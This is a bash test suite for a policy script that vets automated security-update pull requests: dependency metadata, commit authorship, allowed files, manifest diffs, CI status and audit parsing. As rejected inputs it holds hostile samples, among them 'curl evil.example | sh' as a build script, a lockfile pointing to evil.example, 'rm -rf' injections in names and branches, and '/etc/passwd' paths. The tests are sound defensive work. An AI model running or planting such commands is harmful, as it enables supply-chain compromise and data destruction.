#!/usr/bin/env bash
# Tests security-policy.mjs, the decisions of the security-update workflows:
# which dependency metadata is valid, what makes a PR a security update, who
# may have written the commits, which files and manifests may change, how the
# CI state is read, and what the audits report. Pure: JSON in, answers out.
#
#   bash .github/scripts/test-security-policy.sh
set -euo pipefail
source "$(dirname "$0")/test-lib.sh"
mkdir -p "$tmp/work"
cd "$tmp/work"
policy=$scripts/security-policy.mjs

# ok NAME WANT CMD...: stdin is $IN; the command succeeds and prints WANT.
ok() {
  local name=$1 want=$2
  shift 2
  local got rc=0
  got=$(node "$policy" "$@" <<<"$IN" 2>"$tmp/err") || rc=$?
  if ((rc != 0)); then check "$name: exit" "$rc" 0; echo "    stderr: $(cat "$tmp/err")"; return; fi
  contains "$name" "$got" "$want"
}
# bad NAME WANT CMD...: stdin is $IN; the command fails with WANT in its reasons.
bad() {
  local name=$1 want=$2
  shift 2
  local rc=0
  node "$policy" "$@" <<<"$IN" >"$tmp/stdout" 2>"$tmp/err" || rc=$?
  check "$name: refused" "$rc" 1
  contains "$name: reason" "$(cat "$tmp/err")" "$want"
}

dep() { # eco name type update prev next [alert]
  node -e '
    const [eco, name, type, update, prev, next, alert] = process.argv.slice(1);
    console.log(JSON.stringify({ dependencyName: name, dependencyType: type, updateType: "version-update:semver-" + update,
      directory: "/", packageEcosystem: eco, targetBranch: "main", prevVersion: prev, newVersion: next, alertState: alert ?? "", ghsaId: "", cvss: 0 }));
  ' "$@"
}

echo "== deps: the metadata is validated"
IN="[$(dep go_modules github.com/gofrs/flock direct:production patch 0.13.0 0.13.1),$(dep npm_and_yarn @scope/pkg indirect minor 1.2.3 1.3.0)]"
ok "valid go dep" $'0\tGo\tgithub.com/gofrs/flock\t0.13.0\t0.13.1\tdirect:production\tversion-update:semver-patch' deps
ok "valid npm dep" $'1\tnpm\t@scope/pkg\t1.2.3\t1.3.0\tindirect' deps
IN="[$(dep go_modules github.com/x/y direct:production patch v1.0.0 v1.0.1)]"
ok "a leading v is dropped" $'1.0.0\t1.0.1' deps
IN="[$(dep cargo serde direct:production patch 1.0.0 1.0.1)]"
bad "other ecosystem" "is not go_modules or npm_and_yarn" deps
IN="[$(dep npm_and_yarn 'x"; rm -rf /' direct:production patch 1.0.0 1.0.1)]"
bad "name with a quote and a command" "is not a valid npm package name" deps
IN="[$(dep go_modules 'github.com/a b/c' direct:production patch 1.0.0 1.0.1)]"
bad "name with a space" "is not a valid Go package name" deps
IN="[$(dep npm_and_yarn UPPER direct:production patch 1.0.0 1.0.1)]"
bad "npm names are lower case" "is not a valid npm package name" deps
IN="[$(dep npm_and_yarn ok direct:production patch '1.0.0;x' 1.0.1)]"
bad "bad version" "is not a version" deps
IN="[$(dep npm_and_yarn ok weird patch 1.0.0 1.0.1)]"
bad "unknown dependency type" "dependency type" deps
IN='[{"dependencyName":"ok","dependencyType":"indirect","updateType":"nonsense","packageEcosystem":"npm_and_yarn","prevVersion":"1.0.0","newVersion":"1.0.1"}]'
bad "unknown update type" "update type" deps
IN='[]'
bad "empty list" "empty" deps
IN='not json'
bad "not JSON" "not JSON" deps
IN="[$(for i in $(seq 1 26); do dep npm_and_yarn "p$i" indirect patch 1.0.0 1.0.1; echo ,; done | tr -d '\n' | sed 's/,$//')]"
bad "too many dependencies" "more than 25" deps

echo "== classify: a security update, and not a major bump of a direct dependency"
osv=$tmp/osv
mkdir -p "$osv"
echo '{"vulns":[{"id":"GHSA-aaaa-bbbb-cccc"},{"id":"GO-2026-0001"}]}' >"$osv/osv-0-old.json"
echo '{"vulns":[{"id":"GO-2026-0001"}]}' >"$osv/osv-0-new.json"
IN="[$(dep go_modules github.com/gofrs/flock direct:production patch 0.13.0 0.13.1)]"
ok "an advisory is gone: security" "security=true" classify "$osv"
ok "...eligible" "eligible=true" classify "$osv"
ok "...names the advisory" "advisories=github.com/gofrs/flock: GHSA-aaaa-bbbb-cccc" classify "$osv"
echo '{"vulns":[{"id":"GHSA-aaaa-bbbb-cccc"}]}' >"$osv/osv-0-old.json"
echo '{"vulns":[{"id":"GHSA-aaaa-bbbb-cccc"}]}' >"$osv/osv-0-new.json"
ok "the advisory is still there: not security" "security=false" classify "$osv"
ok "...not eligible" "eligible=false" classify "$osv"
ok "...says why" "not a security update" classify "$osv"
echo '{}' >"$osv/osv-0-old.json"
echo '{}' >"$osv/osv-0-new.json"
ok "no advisories at all: not security" "security=false" classify "$osv"
rm -f "$osv"/osv-0-*.json
ok "no OSV answer: not security" "security=false" classify "$osv"
IN="[$(dep go_modules github.com/gofrs/flock direct:production patch 0.13.0 0.13.1 OPEN)]"
ok "an open Dependabot alert: security" "security=true" classify "$osv"
ok "...eligible" "eligible=true" classify "$osv"
IN="[$(dep go_modules github.com/gofrs/flock direct:production patch 0.13.0 0.13.1 FIXED)]"
ok "a fixed alert is not enough" "security=false" classify "$osv"
IN="[$(dep go_modules github.com/mark3labs/mcp-go direct:production major 0.55.1 1.1.0 OPEN)]"
ok "a major bump of a direct dependency: not eligible" "eligible=false" classify "$osv"
ok "...says why" "semver-major bump of a direct dependency" classify "$osv"
IN="[$(dep npm_and_yarn ws indirect major 7.5.0 8.18.1 OPEN)]"
ok "a major bump of an indirect dependency is fine" "eligible=true" classify "$osv"
IN="[$(dep npm_and_yarn webpack direct:development major 4.0.0 5.0.0 OPEN)]"
ok "a major bump of a direct dev dependency: not eligible" "eligible=false" classify "$osv"
echo '{"vulns":[{"id":"GHSA-xxxx-yyyy-zzzz"}]}' >"$osv/osv-1-old.json"
echo '{}' >"$osv/osv-1-new.json"
IN="[$(dep go_modules a/b direct:production patch 1.0.0 1.0.1),$(dep npm_and_yarn ws indirect patch 8.0.0 8.0.1)]"
ok "one dependency of a group fixes an advisory" "security=true" classify "$osv"

echo "== pr: the pull request itself"
pr_json() { # state draft base repo author ref
  node -e '
    const [state, draft, base, repo, author, ref] = process.argv.slice(1);
    console.log(JSON.stringify({ state, draft: draft === "true", base: { ref: base }, user: { login: author },
      head: { ref, sha: "a".repeat(40), repo: { full_name: repo } } }));
  ' "$@"
}
good_ref=dependabot/go_modules/github.com/gofrs/flock-0.13.1
IN=$(pr_json open false main example/repo 'dependabot[bot]' "$good_ref")
ok "a Dependabot PR" "head_ref=$good_ref" pr example/repo main
ok "...its head" "head_sha=$(printf 'a%.0s' {1..40})" pr example/repo main
IN=$(pr_json open false main example/repo 'github-actions[bot]' security/2026-10-29)
ok "a security/ PR by the workflow" "author=github-actions[bot]" pr example/repo main
IN=$(pr_json open false main example/repo 'github-actions[bot]' security/2026-10-29-2)
ok "...with a counter" "head_ref=security/2026-10-29-2" pr example/repo main
IN=$(pr_json closed false main example/repo 'dependabot[bot]' "$good_ref")
bad "closed" "the PR is closed" pr example/repo main
IN=$(pr_json open true main example/repo 'dependabot[bot]' "$good_ref")
bad "draft" "draft" pr example/repo main
IN=$(pr_json open false develop example/repo 'dependabot[bot]' "$good_ref")
bad "another base" "not into main" pr example/repo main
IN=$(pr_json open false main fork/repo 'dependabot[bot]' "$good_ref")
bad "from a fork" "another repository" pr example/repo main
IN=$(pr_json open false main example/repo someone "$good_ref")
bad "a person's PR" "is not dependabot[bot] or github-actions[bot]" pr example/repo main
IN=$(pr_json open false main example/repo 'dependabot[bot]' security/2026-10-29)
bad "a Dependabot PR on a security/ branch" "not one dependabot[bot] makes" pr example/repo main
IN=$(pr_json open false main example/repo 'github-actions[bot]' "$good_ref")
bad "the workflow's PR on a Dependabot branch" "not one github-actions[bot] makes" pr example/repo main
IN=$(pr_json open false main example/repo 'dependabot[bot]' 'dependabot/go_modules/x;rm -rf')
bad "a branch with odd characters" "not one dependabot[bot] makes" pr example/repo main

echo "== commits: who wrote them"
commits() { # login:subject ...
  node -e '
    console.log(JSON.stringify(process.argv.slice(1).map((s) => { const i = s.indexOf(":"); const l = s.slice(0, i);
      return { author: l === "none" ? null : { login: l }, commit: { message: s.slice(i + 1) + "\n\nbody" } }; })));
  ' "$@"
}
IN=$(commits 'dependabot[bot]:chore(deps): bump x from 1 to 2')
ok "Dependabot only" "mode=deps" commits 'dependabot[bot]'
IN=$(commits 'dependabot[bot]:chore(deps): bump x' 'dependabot[bot]:Merge branch main')
ok "Dependabot twice (a rebase)" "mode=deps" commits 'dependabot[bot]'
IN=$(commits 'dependabot[bot]:chore(deps): bump x' 'github-actions[bot]:fix(deps): adapt code to the dependency update')
ok "Dependabot, then our fix" "mode=fix" commits 'dependabot[bot]'
IN=$(commits 'github-actions[bot]:chore(deps): fix security advisories (3)')
ok "the scan's own PR" "mode=deps" commits 'github-actions[bot]'
IN=$(commits 'github-actions[bot]:chore(deps): fix security advisories (3)' 'github-actions[bot]:fix(deps): adapt code to the dependency update')
ok "the scan's PR with our fix" "mode=fix" commits 'github-actions[bot]'
IN=$(commits 'dependabot[bot]:chore(deps): bump x' 'octocat:tweak')
bad "a person's commit on top" "only Dependabot's and this automation's commits" commits 'dependabot[bot]'
IN=$(commits 'dependabot[bot]:chore(deps): bump x' 'none:tweak')
bad "a commit with no GitHub account" "commit 2 is by" commits 'dependabot[bot]'
IN=$(commits 'octocat:chore(deps): bump x')
bad "a person's first commit" "first commit" commits 'dependabot[bot]'
IN=$(commits 'dependabot[bot]:chore(deps): bump x' 'github-actions[bot]:feat: add a backdoor')
bad "our bot with another subject" "unexpected subject" commits 'dependabot[bot]'
IN=$(commits 'dependabot[bot]:chore(deps): bump x' 'github-actions[bot]:chore(deps): fix security advisories (3)')
bad "the scan's subject in Dependabot's PR" "unexpected subject" commits 'dependabot[bot]'
IN=$(commits 'github-actions[bot]:chore(deps): fix security advisories (3)' 'dependabot[bot]:chore(deps): bump x')
bad "Dependabot's commit in the workflow's PR" "in a PR by github-actions[bot]" commits 'github-actions[bot]'
IN=$(node -e 'console.log(JSON.stringify(Array(11).fill({author:{login:"dependabot[bot]"},commit:{message:"x"}})))')
bad "eleven commits" "more than 10" commits 'dependabot[bot]'
IN='[]'
bad "no commits" "no commits" commits 'dependabot[bot]'

echo "== files: what a PR may change"
files() { # status:name:adds:dels ...
  node -e '
    console.log(JSON.stringify(process.argv.slice(1).map((s) => { const [status, filename, a, d] = s.split(":");
      return { status, filename, additions: Number(a ?? 1), deletions: Number(d ?? 1) }; })));
  ' "$@"
}
IN=$(files modified:go.mod:1:1 modified:go.sum:2:2)
ok "go.mod and go.sum" "touches_go=true" files deps
ok "...need the Go builds" "required=build (ubuntu-latest),build (macos-latest),build (windows-latest),build" files deps
IN=$(files modified:site/package-lock.json:30:30)
ok "the npm lock" "touches_site=true" files deps
ok "...needs the docs build" "required=docs" files deps
IN=$(files modified:site/package.json:1:1 modified:site/package-lock.json:3:3 modified:go.mod:1:1)
ok "all together" "required=build (ubuntu-latest),build (macos-latest),build (windows-latest),build,docs" files deps
IN=$(files modified:go.mod modified:.github/workflows/build.yml)
bad "a workflow" "under .github/" files deps
IN=$(files modified:go.mod added:.github/scripts/x.sh)
bad "a script under .github" "under .github/" files deps
IN=$(files modified:go.mod modified:src/cmd/raid.go)
bad "code in a dependency update" "is not a dependency manifest" files deps
IN=$(files modified:go.mod modified:install.sh)
bad "install.sh" "is not a dependency manifest" files deps
IN=$(files modified:go.mod modified:raid.yaml)
bad "raid.yaml (it runs tasks)" "is not a dependency manifest" files deps
IN=$(files modified:go.mod modified:../etc/passwd)
bad "a path out of the tree" "not a plain repository path" files deps
IN=$(files modified:go.mod modified:/etc/passwd)
bad "an absolute path" "not a plain repository path" files deps
IN=$(files modified:go.mod 'modified:a b')
bad "a path with a space" "not a plain repository path" files deps
IN=$(files modified:go.mod modified:site/./package.json)
bad "a dot segment" "not a plain repository path" files deps
IN=$(files removed:go.sum)
bad "a manifest removed" "manifests may only be modified" files deps
IN=$(files renamed:go.mod)
bad "a manifest renamed" "manifests may only be modified" files deps
IN=$(files modified:go.mod:5000:4000)
bad "a huge change" "more than 8000" files deps
IN='[]'
bad "no files" "no files" files deps
IN=$(files modified:go.mod modified:.git/config)
bad ".git" "under .github/ or .git/" files deps

echo "== files: what a fix may change in addition"
IN=$(files modified:go.mod:1:1 modified:go.sum modified:src/cmd/raid.go:10:2 added:src/cmd/raid_test.go:30:0 modified:src/resources/app.properties:1:1 modified:site/docs/a.mdx:2:1 modified:README.md modified:llms.txt modified:main.go)
ok "code, tests, version, docs" "touches_src=true" files fix
IN=$(files modified:src/cmd/raid.go modified:.github/workflows/build.yml)
bad "a fix touching a workflow" "under .github/" files fix
IN=$(files modified:src/cmd/raid.go modified:install.sh)
bad "a fix touching install.sh" "outside what a fix may change" files fix
IN=$(files modified:src/cmd/raid.go modified:workers/feedback/index.js)
bad "a fix touching workers/" "outside what a fix may change" files fix
IN=$(files modified:src/cmd/raid.go modified:.goreleaser.yaml)
bad "a fix touching the release config" "outside what a fix may change" files fix
IN=$(files modified:src/cmd/raid.go modified:site/docusaurus.config.ts)
bad "a fix touching the docs site config" "outside what a fix may change" files fix
IN=$(files modified:src/cmd/raid.go renamed:src/cmd/old.go)
bad "a rename" "renames, copies and mode changes" files fix
IN=$(files modified:src/cmd/raid.go:400:300)
bad "too many lines" "more than 600" files fix
IN=$(node -e 'console.log(JSON.stringify(Array.from({length:21},(_, i)=>({status:"modified",filename:"src/f"+i+".go",additions:1,deletions:0}))))')
bad "too many files" "more than 20" files fix
IN=$(files modified:go.mod:9000:9000 modified:src/cmd/raid.go:3:3)
ok "the manifests do not count against a fix's size" "touches_src=true" files fix

echo "== patch-files: Claude's patch, as git reads it"
IN=$'3\t1\tsrc/cmd/raid.go\n 1 file changed'
ok "a plain patch" "files=src/cmd/raid.go" patch-files fix
IN=$'3\t1\tsrc/cmd/raid.go\n1\t0\tsrc/cmd/new.go\n create mode 100644 src/cmd/new.go'
ok "a new file" "files=src/cmd/raid.go,src/cmd/new.go" patch-files fix
IN=$'1\t0\tsrc/cmd/link.go\n create mode 120000 src/cmd/link.go'
bad "a symlink" "is a symbolic link" patch-files fix
IN=$'1\t0\tsrc/cmd/run.go\n create mode 100755 src/cmd/run.go'
bad "an executable file" "is an executable file" patch-files fix
IN=$'-\t-\tsrc/cmd/blob.go'
bad "a binary change" "is a binary change" patch-files fix
IN=$'0\t0\tsrc/cmd/a.go\n rename src/cmd/{a.go => b.go} (100%)'
bad "a rename" "has a rename" patch-files fix
IN=$'0\t0\tsrc/cmd/a.go\n mode change 100644 => 100755 src/cmd/a.go'
bad "a mode change" "changes a file mode" patch-files fix
IN=$'1\t1\tgo.mod'
bad "a fix that changes go.mod" "may not change the dependency manifests" patch-files fix
IN=$'1\t1\tsite/package-lock.json'
bad "a fix that changes the lock" "may not change the dependency manifests" patch-files fix
IN=$'1\t1\t.github/workflows/build.yml'
bad "a fix that changes a workflow" "under .github/" patch-files fix
IN=$'1\t1\tgo.mod\n2\t2\tgo.sum'
ok "a dependency patch may change the manifests" "files=go.mod,go.sum" patch-files deps
IN=$'1\t1\tgo.mod\n2\t2\tsrc/cmd/raid.go'
bad "a dependency patch may not change code" "is not a dependency manifest" patch-files deps

echo "== manifests: what a dependency change may do"
mk_tree() { # dir
  mkdir -p "$1/site"
  cat >"$1/go.mod" <<'EOT'
module github.com/8bitAlex/raid

go 1.25.5

require (
	github.com/gofrs/flock v0.13.0
	github.com/spf13/cobra v1.9.1
)

require (
	github.com/inconshreveable/mousetrap v1.1.0 // indirect
)
EOT
  cat >"$1/site/package.json" <<'EOT'
{ "name": "site", "version": "0.0.0", "scripts": { "build": "docusaurus build" },
  "dependencies": { "react": "19.0.0" }, "devDependencies": { "typescript": "5.0.0" } }
EOT
  cat >"$1/site/package-lock.json" <<'EOT'
{ "name": "site", "lockfileVersion": 3, "packages": {
  "": { "name": "site" },
  "node_modules/react": { "version": "19.0.0", "resolved": "https://registry.npmjs.org/react/-/react-19.0.0.tgz" },
  "node_modules/ws": { "version": "7.5.0", "resolved": "https://registry.npmjs.org/ws/-/ws-7.5.0.tgz" },
  "node_modules/typescript": { "version": "5.0.0", "resolved": "https://registry.npmjs.org/typescript/-/typescript-5.0.0.tgz" } } }
EOT
}
mk_tree "$tmp/base"
head_tree() { rm -rf "$tmp/head"; cp -r "$tmp/base" "$tmp/head"; }
changes_ok() { # name want
  local got rc=0
  got=$(node "$policy" manifests "$tmp/base" "$tmp/head" "${@:3}" 2>"$tmp/err") || rc=$?
  check "$1: exit" "$rc" 0
  contains "$1" "$got" "$2"
}
changes_bad() { # name want
  local rc=0
  node "$policy" manifests "$tmp/base" "$tmp/head" "${@:3}" >"$tmp/stdout" 2>"$tmp/err" || rc=$?
  check "$1: refused" "$rc" 1
  contains "$1: reason" "$(cat "$tmp/err")" "$2"
}
head_tree
changes_ok "nothing changed" ""
head_tree
sed -i 's/flock v0.13.0/flock v0.13.1/' "$tmp/head/go.mod"
changes_ok "a Go bump" "change: go github.com/gofrs/flock v0.13.0 v0.13.1"
head_tree
sed -i 's/flock v0.13.0/flock v1.0.0/' "$tmp/head/go.mod"
changes_ok "a Go major jump passes without --no-major" "change: go github.com/gofrs/flock v0.13.0 v1.0.0"
changes_bad "...and fails with it" "jumps from v0.13.0 to v1.0.0" --no-major
head_tree
printf '\nrequire github.com/evil/new v1.0.0\n' >>"$tmp/head/go.mod"
changes_bad "a new direct module" "github.com/evil/new is a new direct dependency"
head_tree
printf '\nrequire (\n\tgithub.com/a/one v1.0.0 // indirect\n\tgithub.com/a/two v1.0.0 // indirect\n)\n' >>"$tmp/head/go.mod"
changes_ok "two new indirect modules" "change: go github.com/a/one  v1.0.0"
head_tree
for i in 1 2 3 4 5 6; do printf '\nrequire github.com/a/m%s v1.0.0 // indirect\n' "$i" >>"$tmp/head/go.mod"; done
changes_bad "six new indirect modules" "6 new indirect modules"
head_tree
sed -i 's/^go 1.25.5/go 1.26.0/' "$tmp/head/go.mod"
changes_bad "the go directive" "a directive other than require changed"
head_tree
printf '\nreplace github.com/gofrs/flock => ../evil\n' >>"$tmp/head/go.mod"
changes_bad "a replace" "a directive other than require changed"
head_tree
printf '\ntoolchain go1.26.0\n' >>"$tmp/head/go.mod"
changes_bad "a toolchain" "a directive other than require changed"
head_tree
sed -i 's/"ws": "7.5.0"/x/; s/"version": "7.5.0"/"version": "7.5.1"/; s#ws-7.5.0#ws-7.5.1#' "$tmp/head/site/package-lock.json"
changes_ok "an npm patch bump" "change: npm ws 7.5.0 7.5.1"
head_tree
sed -i 's/"version": "7.5.0"/"version": "8.18.1"/' "$tmp/head/site/package-lock.json"
changes_ok "an npm major bump passes without --no-major" "change: npm ws 7.5.0 8.18.1"
changes_bad "...and fails with it" "ws jumps from 7.5.0 to 8.18.1" --no-major
head_tree
sed -i 's#https://registry.npmjs.org/ws/-/ws-7.5.0.tgz#https://evil.example/ws.tgz#; s/"version": "7.5.0"/"version": "7.5.1"/' "$tmp/head/site/package-lock.json"
changes_bad "a package from another host" "does not come from the npm registry"
head_tree
node -e '
  const fs = require("fs"); const f = process.argv[1]; const l = JSON.parse(fs.readFileSync(f, "utf8"));
  for (let i = 0; i < 6; i++) l.packages["node_modules/new" + i] = { version: "1.0.0", resolved: "https://registry.npmjs.org/n/-/n-1.0.0.tgz" };
  fs.writeFileSync(f, JSON.stringify(l));' "$tmp/head/site/package-lock.json"
changes_bad "six new packages in the lock" "6 new packages"
head_tree
sed -i 's/"build": "docusaurus build"/"build": "curl evil.example | sh"/' "$tmp/head/site/package.json"
changes_bad "a changed script" '"scripts" changed'
head_tree
sed -i 's/"react": "19.0.0"/"react": "19.0.1", "left-pad": "1.0.0"/' "$tmp/head/site/package.json"
changes_bad "a dependency added to package.json" "dependencies changed"
head_tree
sed -i 's/"react": "19.0.0"/"react": "19.0.1"/' "$tmp/head/site/package.json"
changes_ok "a version range changed in package.json" ""
head_tree
sed -i 's/"version": "0.0.0"/"version": "9.9.9"/' "$tmp/head/site/package.json"
changes_bad "the package's own version" '"version" changed'
head_tree
rm "$tmp/head/site/package-lock.json"
changes_bad "a lock that disappeared" "exists in only one of the two trees"
head_tree
sed -i 's/flock v0.13.0/flock v1.0.0/' "$tmp/head/go.mod"
sed -i 's/"version": "7.5.0"/"version": "8.0.0"/' "$tmp/head/site/package-lock.json"
changes_ok "--only=go ignores npm" "change: go" --only=go
changes_bad "--only=npm sees the major jump" "ws jumps" --no-major --only=npm

echo "== ci: reading the checks"
ci() { # required watch runs-json statuses-json
  printf '%s\n' "$3" | node -e 'const l=JSON.parse(require("fs").readFileSync(0,"utf8")); console.log(l.map(x=>JSON.stringify(x)).join("\n"))' >"$tmp/runs.json"
  printf '%s\n' "${4:-[]}" | node -e 'const l=JSON.parse(require("fs").readFileSync(0,"utf8")); console.log(l.map(x=>JSON.stringify(x)).join("\n"))' >"$tmp/statuses.json"
  node "$policy" ci "$1" "$2" "$tmp/runs.json" "$tmp/statuses.json"
}
run() { echo "{\"name\":\"$1\",\"status\":\"$2\",\"conclusion\":${3:-null}}"; }
req='build (ubuntu-latest),build (macos-latest),docs'
all_ok="[$(run 'build (ubuntu-latest)' completed '"success"'),$(run 'build (macos-latest)' completed '"success"'),$(run docs completed '"success"')]"
contains "all required green" "$(ci "$req" CodeQL "$all_ok")" "ci=green"
contains "an extra skipped check is fine" "$(ci "$req" CodeQL "${all_ok%]},$(run CodeQL completed '"skipped"')]")" "ci=green"
contains "a required check is missing: wait" "$(ci "$req" CodeQL "[$(run 'build (ubuntu-latest)' completed '"success"')]")" "ci=wait"
contains "...says which" "$(ci "$req" CodeQL "[$(run 'build (ubuntu-latest)' completed '"success"')]")" "build (macos-latest) has not started"
contains "a required check is running: wait" "$(ci "$req" CodeQL "${all_ok%]},$(run 'build (windows-latest)' in_progress)]")" "ci=green"
contains "...but a required one is" "$(ci "$req" CodeQL "[$(run 'build (ubuntu-latest)' in_progress),$(run 'build (macos-latest)' completed '"success"'),$(run docs completed '"success"')]")" "ci=wait"
contains "a required check failed: red" "$(ci "$req" CodeQL "[$(run 'build (ubuntu-latest)' completed '"failure"'),$(run 'build (macos-latest)' completed '"success"'),$(run docs completed '"success"')]")" "ci=red"
contains "a required check skipped: red" "$(ci "$req" CodeQL "[$(run 'build (ubuntu-latest)' completed '"skipped"'),$(run 'build (macos-latest)' completed '"success"'),$(run docs completed '"success"')]")" "ci=red"
contains "a required check cancelled: red" "$(ci "$req" CodeQL "[$(run 'build (ubuntu-latest)' completed '"cancelled"'),$(run 'build (macos-latest)' completed '"success"'),$(run docs completed '"success"')]")" "ci=red"
contains "any other check failing: red" "$(ci "$req" CodeQL "${all_ok%]},$(run lint completed '"failure"')]")" "ci=red"
contains "...even before the required ones are in" "$(ci "$req" CodeQL "[$(run lint completed '"timed_out"')]")" "ci=red"
contains "CodeQL running: wait" "$(ci "$req" CodeQL "${all_ok%]},$(run CodeQL in_progress)]")" "ci=wait"
contains "CodeQL absent is fine" "$(ci "$req" CodeQL "$all_ok")" "ci=green"
contains "another check still running does not hold it" "$(ci "$req" CodeQL "${all_ok%]},$(run codecov queued)]")" "ci=green"
contains "a failed status: red" "$(ci "$req" CodeQL "$all_ok" '[{"context":"codecov/patch","state":"failure"}]')" "ci=red"
contains "a pending status is ignored" "$(ci "$req" CodeQL "$all_ok" '[{"context":"codecov/patch","state":"pending"}]')" "ci=green"
contains "a successful status is fine" "$(ci "$req" CodeQL "$all_ok" '[{"context":"codecov/patch","state":"success"}]')" "ci=green"
contains "this automation's own jobs are ignored" "$(ci "$req" CodeQL "${all_ok%]},$(run 'Security: wait for CI, then merge' in_progress),$(run 'Security: assess' completed '"failure"')]")" "ci=green"

echo "== audit: npm audit's report"
IN='{"vulnerabilities":{
  "ws":{"severity":"high","fixAvailable":true},
  "left-pad":{"severity":"low","fixAvailable":{"name":"left-pad","version":"1.3.1","isSemVerMajor":false}},
  "webpack-dev-server":{"severity":"moderate","fixAvailable":{"name":"webpack-dev-server","version":"6.0.0","isSemVerMajor":true}},
  "old-thing":{"severity":"critical","fixAvailable":false},
  "Bad Name;":{"severity":"high","fixAvailable":true}}}'
ok "fixable: true" $'fixable\tws\thigh' audit
ok "fixable: a non-major object" $'fixable\tleft-pad\tlow' audit
ok "skipped: a major fix" $'skipped\twebpack-dev-server\tmoderate\tthe fix is a semver-major bump' audit
ok "skipped: no fix" $'skipped\told-thing\tcritical\tno fix is available' audit
got=$(node "$policy" audit <<<"$IN")
lacks "a bad name is dropped" "$got" "Bad Name"
got=$(node "$policy" audit high <<<"$IN")
lacks "min severity: low is out" "$got" "left-pad"
contains "min severity: high is in" "$got" $'fixable\tws\thigh'
IN='{}'
check "no vulnerabilities" "$(node "$policy" audit <<<"$IN")" ""

echo "== vuln: govulncheck's stream"
IN=$'{"config":{"protocol_version":"v1.0.0"}}\n{"finding":{"osv":"GO-2026-0001","fixed_version":"v0.17.0","trace":[{"module":"golang.org/x/net","version":"v0.16.0"}]}}\n{\n  "finding": {\n    "osv": "GO-2026-0002",\n    "fixed_version": "v0.18.1",\n    "trace": [{"module": "golang.org/x/net", "version": "v0.16.0"}]\n  }\n}\n{"finding":{"osv":"GO-2026-0003","fixed_version":"go1.25.9","trace":[{"module":"stdlib","version":"go1.25.5"}]}}\n{"finding":{"osv":"GO-2026-0004","fixed_version":"v2.0.1","trace":[{"module":"example.com/m","version":"v1.2.3"}]}}\n{"finding":{"osv":"GO-2026-0005","trace":[{"module":"example.com/n","version":"v1.0.0"}]}}\n{"finding":{"osv":"GO-2026-0006","fixed_version":"v1.0.1","trace":[{"module":"example.com/bad;rm","version":"v1.0.0"}]}}'
ok "the highest fixed version wins, same major" $'fixable\tgolang.org/x/net\tv0.16.0\tv0.18.1\tGO-2026-0001 GO-2026-0002' vuln
ok "the standard library is skipped" $'skipped\tstdlib\tfixed by upgrading the Go toolchain' vuln
ok "a different major is skipped" $'skipped\texample.com/m\tthe fix is a different major version' vuln
ok "no fixed version is skipped" $'skipped\texample.com/n\tno fixed version is known' vuln
got=$(node "$policy" vuln <<<"$IN")
lacks "a bad module path is dropped" "$got" "rm"
IN=$'{"config":{}}'
check "no findings" "$(node "$policy" vuln <<<"$IN")" ""

finish
